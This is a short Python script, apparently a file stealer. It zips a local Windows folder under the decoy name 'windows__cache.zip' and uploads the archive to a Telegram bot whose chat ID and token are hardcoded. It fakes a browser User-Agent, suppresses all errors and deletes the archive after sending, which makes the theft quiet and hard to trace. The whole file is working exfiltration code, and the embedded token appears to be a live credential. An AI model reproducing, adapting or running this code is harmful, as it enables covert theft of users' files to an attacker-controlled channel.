import shutil
import os
import getpass
import requests
from requests.exceptions import RequestException

Chat_id = '1251098499'
Token = '6441831718:AAFOcfKAWNpQoZPftb01SbEr3mEvZsMfEJ0'

def send(chat_id, token):

    current_user = getpass.getuser()
    source_directory = "C:\\Min"
    my_zip = f"windows__cache.zip"

    try:
        shutil.make_archive(my_zip[:-4], 'zip', source_directory)
    except Exception as e:
        pass
        return

    url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    
    try:
        if os.path.exists(my_zip):
            with requests.Session() as session:
                session.headers.update(headers)
                with open(my_zip, 'rb') as file:
                    files = {'document': (my_zip, file)}
                    response = session.post(url, files=files)
                    response.raise_for_status()
                    print("Document sent successfully.")
        else:
            pass
    except RequestException as e:
        pass
    finally:
        try:
            if os.path.exists(my_zip):
                os.remove(my_zip)
            else:
                pass
        except Exception as e:
            pass
